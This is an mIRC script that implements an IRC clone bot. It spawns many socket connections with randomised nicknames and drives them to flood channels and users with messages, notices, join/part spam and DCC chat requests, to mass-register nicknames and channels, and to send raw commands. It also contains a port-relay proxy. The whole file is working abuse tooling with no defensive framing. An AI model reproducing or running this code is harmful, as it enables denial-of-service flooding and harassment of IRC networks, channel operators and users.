on *:sockread:cl0nes*:{
  sockread %cl0nesread
  k33p %cl0nesread
}
alias fln1ck {
  set %fln1ck $rand(1,10)
  if (%fln1ck = 1) { return $read xn1ck5t $+ $chr($r(65,125)) $+ $chr($r(65,125))  }
  if (%fln1ck = 2) { return $chr($r(65,125)) $+ $read xn1ck5t $+ $chr($r(65,125))  }
  if (%fln1ck = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  xn1ck5t }
  if (%fln1ck = 4) { return $r(A,Z) $+ $read xn1ck5t $+ $r(A,Z) }
  if (%fln1ck = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }
  if (%fln1ck = 6) { return $read xn1ck5t $+ $r(1,40) $+ $chr($r(65,125))  }
  if (%fln1ck = 7) { return $r(a,z) $+ $read xn1ck5t $+ $r(a,z) }
  if (%fln1ck = 8) { return $read xn1ck5t $+ $r(a,z) $+ $chr($r(65,125))  }
  if (%fln1ck = 9) { return $read xn1ck5t $+ $r(1,10) $+ $chr($r(65,125))  }
  if (%fln1ck = 10) { return $read xn1ck5t $+ $r(20,50) $+ $chr($r(65,125)) }
}
alias clone {
  if ($1 = con) { set %cserver $2 | /set %cport $3 | /timerruns0ck $+ $fln1ck $4 2 runs0ck }
  if ($1 = join) { sockwrite -nt cl0nes* Join $2- }
  if ($1 = part) { sockwrite -nt cl0nes* Part $2 : $+ $3- }
  if ($1 = msg) { sockwrite -nt cl0nes* privmsg $2 : $+ $3- }
  if ($1 = notice) { sockwrite -nt cl0nes* notice $2 : $+ $3- }
  if ($1 = reg) { sockwrite -nt cl0nes* Privmsg NickServ : $+ register $2- | sockwrite -nt cl0nes* Privmsg NickServ : $+ identify $2- }
  if ($1 = creg) { set %rchan # $+ $fln1ck $+ $rand(1,1000) | sockwrite -nt cl0nes* Join %rchan | sockwrite -nt cl0nes* Privmsg Chanserv : register %rchan $fln1ck cl0nes }
  if ($1 = jp) { sockwrite -nt cl0nes* Join $2- | sockwrite -nt cl0nes* part $2 : $3- | sockwrite -nt cl0nes* Join $2- | sockwrite -nt cl0nes* part $2 : $3- | sockwrite -nt cl0nes* Join $2- | sockwrite -nt cl0nes* part $2 : $3- }
  if ($1 = jmp) { sockwrite -nt cl0nes* Join $2 | sockwrite -nt cl0nes* privmsg $2 : $3- | sockwrite -nt cl0nes* part $2 }
  if ($1 = flood.c) { sockwrite -nt cl0nes* join $2 | sockwrite -nt cl0nes* privmsg $2 : $3- | sockwrite -nt cl0nes* notice $2 : $3- | sockwrite -nt cl0nes* privmsg $2 : $3- }
  if ($1 = flood.n) { sockwrite -nt cl0nes* privmsg $2 : $3- | sockwrite -nt cl0nes* notice $2 : $3- | sockwrite -nt cl0nes* privmsg $2 : $3- }
  if ($1 = chat.flood) { sockwrite -nt cl0nes* privmsg $2 :DCC CHAT $2 1058633484 3481  }
  if ($1 = Quit) { Sockwrite -nt cl0nes* Quit : $+ $2- }
  if ($1 = massquit) { SockWrite -nt cl0nes* Join $2 | Sockwrite -nt cl0nes* Quit : $+ $3- }
  if ($1 = fnick) { sockwrite -nt cl0nes* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }
  if ($1 = Die) { timerruns0ck* off | sockclose cl0nes* }
  if ($1 = kill) { timerruns0ck* off | sockclose cl0nes* }
  if ($1 = quit) { timerruns0ck* off | sockclose cl0nes* }
  if ($1 = -) { sockwrite -nt cl0nes* $3- | halt }
  if ($1 = do) { sockwrite -nt cl0nes* $3- | halt }
}
alias runs0ck { sockopen cl0nes $+ $fln1ck %cserver %cport }
alias k33p {
  if (PING = $1) { sockwrite -nt * $1- }
}
on *:SOCKOPEN:cl0nes*:{
  set -u1 %user $rand(A,Z) $+ $fln1ck $+ $rand(A,Z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $fln1ck
}
on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | shows $sock(gtportdirect.30,1).ip | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum }
on *:Sockread:gtin*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return } | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockread:gtout*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return } | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockopen:gtout*: {  if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname }
on *:sockclose:gtin*: {   unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname }